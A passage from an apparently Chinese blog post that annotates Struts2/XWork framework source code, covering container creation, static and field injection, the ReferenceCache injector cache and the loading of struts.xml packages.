单例类型的bean也需要单独存放在一个列表中</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scope == Scope.SINGLETON) &#123;</span><br><span class="line">        singletonFactories.add(callableFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建容器实例</span></span><br><span class="line"><span class="keyword">public</span> Container <span class="title function_">create</span><span class="params">(<span class="type">boolean</span> loadSingletons)</span> &#123;</span><br><span class="line">    <span class="comment">// 确保容器没有被创建</span></span><br><span class="line">    ensureNotCreated();</span><br><span class="line">    created = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 新建一个 ContainerImpl 实例对象</span></span><br><span class="line">    <span class="comment">// // 将 创建从 type 到 bean name的不可变映射关系 线程安全</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ContainerImpl</span> <span class="variable">container</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerImpl</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(factories));</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (loadSingletons) &#123;</span><br><span class="line">        container.callInContext(<span class="keyword">new</span> <span class="title class_">ContainerImpl</span>.ContextualCallable&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (InternalFactory&lt;?&gt; factory : singletonFactories) &#123;</span><br><span class="line">                    <span class="comment">// 单例的bean 不需要接收返回值  因为创建后其直接被工厂类的instance 变量引用</span></span><br><span class="line">                    <span class="comment">// 每次创建都会直接从 instance 变量中找</span></span><br><span class="line">                    factory.create(context);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    container.callInContext(<span class="keyword">new</span> <span class="title class_">ContainerImpl</span>.ContextualCallable&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">            <span class="comment">// 提前初始化的bean 被标记为 </span></span><br><span class="line">            <span class="comment">// 这类型的bean 有个特定就是实现了 Initializable 接口 并且会在创建时调用  init方法</span></span><br><span class="line">            <span class="comment">// 默认有一个这样的bean被配置  即 DefaultConversionPropertiesProcessor   用作properties 转化器</span></span><br><span class="line">            <span class="comment">// 该类会读取两个properties配置文件取查找对应的转换器</span></span><br><span class="line">            <span class="keyword">for</span> (InternalFactory&lt;?&gt; factory : earlyInitializableFactories) &#123;</span><br><span class="line">                factory.create(context);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 处理被标注为 static的bean 处理其静态字段以及静态方法</span></span><br><span class="line">    container.injectStatics(staticInjections);</span><br><span class="line">    <span class="keyword">return</span> container;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 创建从 type 到 bean name的不可变映射关系 线程安全</span></span><br><span class="line">ContainerImpl(Map&lt;Key&lt;?&gt;, InternalFactory&lt;?&gt;&gt; factories) &#123;</span><br><span class="line">    <span class="built_in">this</span>.factories = factories;</span><br><span class="line">    Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Key&lt;?&gt; key : factories.keySet()) &#123;</span><br><span class="line">        Set&lt;String&gt; names = map.get(key.getType());</span><br><span class="line">        <span class="keyword">if</span> (names == <span class="literal">null</span>) &#123;</span><br><span class="line">            names = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            map.put(key.getType(), names);</span><br><span class="line">        &#125;</span><br><span class="line">        names.add(key.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; entry : map.entrySet()) &#123;</span><br><span class="line">        entry.setValue(Collections.unmodifiableSet(entry.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.factoryNamesByType = Collections.unmodifiableMap(map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">injectStatics</span><span class="params">(List&lt;Class&lt;?&gt;&gt; staticInjections)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;Injector&gt; injectors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 遍历需要被注入静态字段与方法的bean</span></span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; clazz : staticInjections) &#123;</span><br><span class="line">        <span class="comment">// 查找字段注入器 并添加到  injectors 中</span></span><br><span class="line">        addInjectorsForFields(clazz.getDeclaredFields(), <span class="literal">true</span>, injectors);</span><br><span class="line">        <span class="comment">// 查找方法注入器 并添加到 injectors 中</span></span><br><span class="line">        addInjectorsForMethods(clazz.getDeclaredMethods(), <span class="literal">true</span>, injectors);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用注入器进行注入</span></span><br><span class="line">    callInContext(<span class="keyword">new</span> <span class="title class_">ContextualCallable</span>&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Injector injector : injectors) &#123;</span><br><span class="line">                injector.inject(context, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以字段注入器为例子</span></span><br><span class="line"><span class="comment">// name就是字段的Inject注解的value 指向了另一个bean</span></span><br><span class="line"><span class="comment">// field 为需要注入的字段</span></span><br><span class="line"><span class="comment">// container为根容器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">FieldInjector</span><span class="params">(ContainerImpl container, Field field, String name)</span></span><br><span class="line">        <span class="keyword">throws</span> MissingDependencyException &#123;</span><br><span class="line">    <span class="built_in">this</span>.field = field;</span><br><span class="line">    <span class="keyword">if</span> ((!Modifier.isPublic(field.getModifiers()) || !Modifier.isPublic(field.getDeclaringClass().getModifiers()))</span><br><span class="line">            &amp;&amp; !field.isAccessible()) &#123;</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">                sm.checkPermission(<span class="keyword">new</span> <span class="title class_">ReflectPermission</span>(<span class="string">&quot;suppressAccessChecks&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AccessControlException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DependencyException</span>(<span class="string">&quot;Security manager in use, could not access field: &quot;</span></span><br><span class="line">                    + field.getDeclaringClass().getName() + <span class="string">&quot;(&quot;</span> + field.getName() + <span class="string">&quot;)&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建用户注入的key</span></span><br><span class="line">    Key&lt;?&gt; key = Key.newInstance(field.getType(), name);</span><br><span class="line">    <span class="comment">// 在容器中查找待注入的bean 找到的是一个factory 再调用factory的create方法就可以创建bean了</span></span><br><span class="line">    factory = container.getFactory(key);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MissingDependencyException</span>(<span class="string">&quot;No mapping found for dependency &quot;</span> + key + <span class="string">&quot; in &quot;</span> + field + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.externalContext = ExternalContext.newInstance(field, key, container);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(InternalContext context, Object o)</span> &#123;</span><br><span class="line">    ExternalContext&lt;?&gt; previous = context.getExternalContext();</span><br><span class="line">    context.setExternalContext(externalContext);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 给字段设置值</span></span><br><span class="line">        <span class="comment">// 因为是静态字段 所以o应该为null</span></span><br><span class="line">        <span class="comment">// 调用create方法查找bean</span></span><br><span class="line">        field.set(o, factory.create(context));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        context.setExternalContext(previous);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于方法上的注入器来说</span></span><br><span class="line"><span class="comment">// 首先会查找方法上是否有Inject注解 Inject注解的value为默认的bean的名称</span></span><br><span class="line"><span class="comment">// 然后取遍历参数  获得每一个参数的类型然后 查找参数是否被Inject注解 如果有则使用这个注解的值作为 bean的名称取查找bean，</span></span><br><span class="line"><span class="comment">// 如果参数没有被注解 则使用默认名称取查找对应的bean。</span></span><br><span class="line"><span class="comment">// 方法上的Inject注解是必须要有的</span></span><br><span class="line"><span class="meta">@Inject(&quot;default&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">methodA</span><span class="params">(<span class="meta">@Inject(&quot;id&quot;)</span> String id, Test test)</span>;</span><br><span class="line"><span class="comment">// 重构运行时配置</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> RuntimeConfiguration <span class="title function_">buildRuntimeConfiguration</span><span class="params">()</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        Map&lt;String, Map&lt;String, ActionConfig&gt;&gt; namespaceActionConfigs = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;String, String&gt; namespaceConfigs = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历包配置</span></span><br><span class="line">        <span class="keyword">for</span> (PackageConfig packageConfig : packageContexts.values()) &#123;</span><br><span class="line">        <span class="comment">// 如果包配置不是抽象的</span></span><br><span class="line">        <span class="comment">// 这里借鉴了面向对象的理念  抽象包作为父包被集成 不直接参与action以及bean等的定义</span></span><br><span class="line">        <span class="keyword">if</span> (!packageConfig.isAbstract()) &#123;</span><br><span class="line">            <span class="comment">// 获取包命名空间   我未配置</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">namespace</span> <span class="operator">=</span> packageConfig.getNamespace();</span><br><span class="line">        <span class="comment">// null</span></span><br><span class="line">        Map&lt;String, ActionConfig&gt; configs = namespaceActionConfigs.get(namespace);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (configs == <span class="literal">null</span>) &#123;</span><br><span class="line">        configs = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取cationConfig</span></span><br><span class="line">        Map&lt;String, ActionConfig&gt; actionConfigs = packageConfig.getAllActionConfigs();</span><br><span class="line">        <span class="comment">// 遍历actionConfig</span></span><br><span class="line">        <span class="keyword">for</span> (Object o : actionConfigs.keySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">actionName</span> <span class="operator">=</span> (String) o;</span><br><span class="line">        <span class="comment">// 通过actionname获取对应的配置对象</span></span><br><span class="line">        <span class="type">ActionConfig</span> <span class="variable">baseConfig</span> <span class="operator">=</span> actionConfigs.get(actionName);</span><br><span class="line">        <span class="comment">// buildFullActionConfig 方法负责重构actionConfig 主要时对result以及interpretor的重构</span></span><br><span class="line">        configs.put(actionName, buildFullActionConfig(packageConfig, baseConfig));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        namespaceActionConfigs.put(namespace, configs);</span><br><span class="line">        <span class="keyword">if</span> (packageConfig.getFullDefaultActionRef() != <span class="literal">null</span>) &#123;</span><br><span class="line">        namespaceConfigs.put(namespace, packageConfig.getFullDefaultActionRef());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PatternMatcher&lt;<span class="type">int</span>[]&gt; matcher = container.getInstance(PatternMatcher.class);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">appendNamedParameters</span> <span class="operator">=</span> Boolean.parseBoolean(</span><br><span class="line">        container.getInstance(String.class, StrutsConstants.STRUTS_MATCHER_APPEND_NAMED_PARAMETERS)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RuntimeConfigurationImpl</span>(Collections.unmodifiableMap(namespaceActionConfigs),</span><br><span class="line">        Collections.unmodifiableMap(namespaceConfigs), matcher, appendNamedParameters);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h4 id="容器注入方法是如何工作的"><a href="#容器注入方法是如何工作的" class="headerlink" title="容器注入方法是如何工作的"></a>容器注入方法是如何工作的</h4><p>o是调用构造方法创建的bean实例 inject方法负责将该bean中的被Inject注解修饰的字段或者方法参数注入到bean对象中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(<span class="keyword">final</span> Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// callInContext 会先创建一个 InternalContext 然后调用call方法</span></span><br><span class="line">        callInContext(<span class="keyword">new</span> <span class="title class_">ContextualCallable</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">                inject(o, context);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(Object o, InternalContext context)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 jnjectors的get方法获取方法与字段的注入器，然后调用注入器的inject方法</span></span><br><span class="line">List&lt;Injector&gt; injectors = <span class="built_in">this</span>.injectors.get(o.getClass());</span><br><span class="line"><span class="keyword">for</span> (Injector injector : injectors) &#123;</span><br><span class="line">injector.inject(context, o);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jnjectors在容器初始化的时候被定义 </span></span><br><span class="line"><span class="comment">// 定义了一个匿名类对象  该对象为 ReferenceCache类型 </span></span><br><span class="line"><span class="comment">// 重写了create方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt; injectors =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReferenceCache</span>&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt;() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> List&lt;Injector&gt; <span class="title function_">create</span><span class="params">(Class&lt;?&gt; key)</span> &#123;</span><br><span class="line">        List&lt;Injector&gt; injectors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        addInjectors(key, injectors);</span><br><span class="line">        <span class="keyword">return</span> injectors;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到其get方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(<span class="keyword">final</span> Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 先尝试从父类中查找  找不到再调用 internalCreate 方法进行创建</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.get(key);</span><br><span class="line">        <span class="keyword">return</span> (value == <span class="literal">null</span>) ? internalCreate((K) key) : value;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 父类的查找方法</span></span><br><span class="line">        V <span class="title function_">internalGet</span><span class="params">(K key)</span> &#123;</span><br><span class="line">    <span class="comment">// delegate 为一个并发Map，被初始话为空</span></span><br><span class="line">        <span class="comment">// makeKeyReferenceAware 创建了key的引用 默认为强引用类型</span></span><br><span class="line">        <span class="comment">// 这种Class类型的对象 会被经常使用所以被定义为强引用类型 不会再gc的时候被回收 除非不在存在引用计数</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">valueReference</span> <span class="operator">=</span> delegate.get(makeKeyReferenceAware(key));</span><br><span class="line">        <span class="comment">// 返回null</span></span><br><span class="line">        <span class="keyword">return</span> valueReference == <span class="literal">null</span> ? <span class="literal">null</span> : (V) dereferenceValue(valueReference);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 子类创建</span></span><br><span class="line">V <span class="title function_">internalCreate</span><span class="params">(K key)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个未来任务</span></span><br><span class="line">        <span class="comment">// 这里使用多线程的必要性是什么   整个初始化过程都是再单线程的环境中运行的  </span></span><br><span class="line">        <span class="comment">// 这里搞这么复杂的必要性没看出来</span></span><br><span class="line">        <span class="comment">// 且创建线程也是额外的开销 </span></span><br><span class="line">        <span class="comment">// 上面只考虑了初始化过程是单线程的 但实际使用是并不只有初始化时参会调用到该方法</span></span><br><span class="line">        <span class="comment">// 如果时用户触发了这个方法则可能时在多线程环境中 这时候就要保证线程安全</span></span><br><span class="line">        <span class="comment">// CallableCreate 的call方法是核心</span></span><br><span class="line">FutureTask&lt;V&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">CallableCreate</span>(key));</span><br><span class="line"></span><br><span class="line"><span class="comment">// use a reference so we get the same equality semantics.</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">keyReference</span> <span class="operator">=</span> referenceKey(key);</span><br><span class="line"><span class="comment">// 将任务放入到线程安全的map中</span></span><br><span class="line">Future&lt;V&gt; future = futures.putIfAbsent(keyReference, futureTask);</span><br><span class="line"><span class="comment">// 如果map中没有已经存在的future，那么当前线程负责调用该future</span></span><br><span class="line"><span class="keyword">if</span> (future == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// winning thread.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (localFuture.get() != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Nested creations within the same cache are not allowed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// threadLocal 类型 每个线程各一</span></span><br><span class="line">        <span class="comment">// 用来避免重复嵌套创建</span></span><br><span class="line">localFuture.set(futureTask);</span><br><span class="line"><span class="comment">// 运行task</span></span><br><span class="line">futureTask.run();</span><br><span class="line"><span class="comment">// 阻塞等待获取</span></span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> futureTask.get();</span><br><span class="line"><span class="comment">// 通过put的策略将注入器添加到引用map中</span></span><br><span class="line">        <span class="comment">// 下次访问的时候直接通过keyReference进行get 就不再需要重新创建了</span></span><br><span class="line">putStrategy().execute(<span class="built_in">this</span>, keyReference, referenceValue(keyReference, value));</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">localFuture.remove();</span><br><span class="line">futures.remove(keyReference);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果map中存在已经存在的future，那么当前线程负责等待该future执行完毕 </span></span><br><span class="line">        <span class="comment">// 避免重复创建注入器</span></span><br><span class="line"><span class="comment">// wait for winning thread.</span></span><br><span class="line"><span class="keyword">return</span> future.get();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line"><span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line"><span class="keyword">if</span> (cause <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line"><span class="keyword">throw</span> (RuntimeException) cause;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line"><span class="keyword">throw</span> (Error) cause;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(cause);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// try one more time (a previous future could have come and gone.)</span></span><br><span class="line">        <span class="comment">// 再次尝试从缓存中获取  说是为了避免其他future以及成功创建了注入器</span></span><br><span class="line">        <span class="comment">// 但问题是这个init过程也不是多线程的啊。。。。</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> internalGet(key);</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create value.</span></span><br><span class="line">        value = create(key);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;create(K) returned null for: &quot;</span> + key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt; injectors = <span class="keyword">new</span> <span class="title class_">ReferenceCache</span>&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt;() &#123;</span><br><span class="line"><span class="keyword">protected</span> List&lt;Injector&gt; <span class="title function_">create</span><span class="params">(Class&lt;?&gt; key)</span> &#123;</span><br><span class="line">        List&lt;Injector&gt; injectors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        ContainerImpl.<span class="built_in">this</span>.addInjectors(key, injectors);</span><br><span class="line">        <span class="keyword">return</span> injectors;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入器的部分前面提到过 这里不再赘述</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addInjectors</span><span class="params">(Class clazz, List&lt;Injector&gt; injectors)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (clazz == Object.class) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递归调用  获取父类字段以及方法注入器</span></span><br><span class="line"><span class="comment">// Add injectors for superclass first.</span></span><br><span class="line">addInjectors(clazz.getSuperclass(), injectors);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO (crazybob): Filter out overridden members.</span></span><br><span class="line">        <span class="comment">// 获取字段注入器</span></span><br><span class="line">addInjectorsForFields(clazz.getDeclaredFields(), <span class="literal">false</span>, injectors);</span><br><span class="line"><span class="comment">// 获取方法注入器</span></span><br><span class="line">addInjectorsForMethods(clazz.getDeclaredMethods(), <span class="literal">false</span>, injectors);</span><br><span class="line">&#125;       </span><br><span class="line"><span class="comment">// 注入器会通过反射的方式去设置bean对象的字段以及方法</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<h3 id="struts-xml-package处理"><a href="#struts-xml-package处理" class="headerlink" title="struts.xml package处理"></a>struts.xml package处理</h3><p>对package的处理实际上也就是对action的处理，通过StutsXmlCOnfigurationProvider的loadPackages方法来进行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadPackages</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ActionContext</span> <span class="variable">ctx</span> <span class="operator">=</span> ActionContext.getContext();</span><br><span class="line">        ctx.put(reloadKey, Boolean.TRUE);</span><br><span class="line">        <span class="comment">// 调用父类方法</span></span><br><span class="line">        <span class="built_in">super</span>.loadPackages();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadPackages</span><span class="params">()</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        List&lt;Element&gt; reloads = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Element&gt;();</span><br><span class="line">        verifyPackageStructure();</span><br><span class="line">        <span class="comment">// struts标签下的内容</span></span><br><span class="line">        <span class="keyword">for</span> (Document doc : documents) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">        <span class="comment">// 获取所有子标签</span></span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">childSize</span> <span class="operator">=</span> children.getLength();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; childSize; i++) &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> children.item(i);</span><br><span class="line">        <span class="comment">// 如果时元素标签</span></span><br><span class="line">        <span class="keyword">if</span> (childNode <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">child</span> <span class="operator">=</span> (Element) childNode;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNodeName();</span><br><span class="line">        <span class="comment">// 如果节点名为 package</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;package&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">            <span class="comment">// 向配置类中添加 packageConfig</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> addPackage(child);</span><br><span class="line">        <span class="keyword">if</span> (cfg.isNeedsRefresh()) &#123;</span><br><span class="line">        reloads.add(child);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 用户可集成strutsConfigurationProvider 重写 loadExtraConfiguration方法 实现扩展的功能 主要时对struts.xml等文件的解析 如增加新的标签等  。。。。</span></span><br><span class="line">        loadExtraConfiguration(doc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (reloads.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        reloadRequiredPackages(reloads);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重复调用</span></span><br><span class="line">        <span class="keyword">for</span> (Document doc : documents) &#123;</span><br><span class="line">        loadExtraConfiguration(doc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        documents.clear();</span><br><span class="line">        declaredPackages.clear();</span><br><span class="line">        configuration = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span> PackageConfig <span class="title function_">addPackage</span><span class="params">(Element packageElement)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">    <span class="comment">// 获取package name</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">packageName</span> <span class="operator">=</span> packageElement.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// configguration 中存在一个默认的包配置名为struts-default</span></span><br><span class="line">        <span class="comment">// 我们配置的包名为 default  现在还没有被创建</span></span><br><span class="line">        <span class="comment">// 如果我们将我们的包名设置为 struts-default 则会导致我们的包的内容无效</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">packageConfig</span> <span class="operator">=</span> configuration.getPackageConfig(packageName);</span><br><span class="line">        <span class="keyword">if</span> (packageConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">        LOG.debug(<span class="string">&quot;Package [&#123;&#125;] already loaded, skipping re-loading it and using existing 